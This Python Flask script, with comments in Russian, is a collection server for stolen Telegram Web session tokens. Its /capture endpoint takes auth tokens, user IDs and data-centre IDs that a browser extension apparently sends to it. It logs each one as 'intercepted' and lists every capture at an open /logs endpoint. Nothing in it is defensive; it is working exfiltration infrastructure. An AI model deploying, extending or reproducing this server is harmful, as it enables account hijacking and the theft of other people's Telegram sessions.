from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import urllib.parse

app = Flask(__name__)
CORS(app)

tokens = []

@app.route('/capture', methods=['GET', 'POST', 'OPTIONS'])
def capture():
    # Обработка OPTIONS (preflight) для CORS
    if request.method == 'OPTIONS':
        response = app.make_default_options_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return response

    # Если это POST (на случай, если расширение ещё использует POST)
    if request.method == 'POST':
        data = request.get_json()
        if data and 'token' in data:
            tokens.append(data)
            print(f"[+] Токен перехвачен (POST): {data['token']}")
            return '', 200
        return 'Invalid JSON', 400

    # Если это GET (новый способ)
    if request.method == 'GET':
        hash_param = request.args.get('hash')
        if not hash_param:
            return 'Missing hash parameter', 400

        # Убираем ведущий # если есть
        if hash_param.startswith('#'):
            hash_param = hash_param[1:]

        # Парсим параметры из хеша (формат key1=value1&key2=value2)
        params = urllib.parse.parse_qs(hash_param)
        token = params.get('tgWebAuthToken', [None])[0]
        user_id = params.get('tgWebAuthUserId', [None])[0]
        dc_id = params.get('tgWebAuthDcId', [None])[0]

        if token:
            token_data = {
                'token': token,
                'user_id': user_id,
                'dc_id': dc_id
            }
            tokens.append(token_data)
            print(f"[+] Токен перехвачен (GET): {token}")
            return f"Token captured successfully! Token: {token}", 200
        else:
            return 'Token not found in hash', 400

    return 'Method not allowed', 405

@app.route('/logs', methods=['GET'])
def logs():
    return jsonify(tokens)

@app.route('/')
def index():
    return 'Server is running. Use /capture?hash=... to capture token, or /logs to see captured tokens.'

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
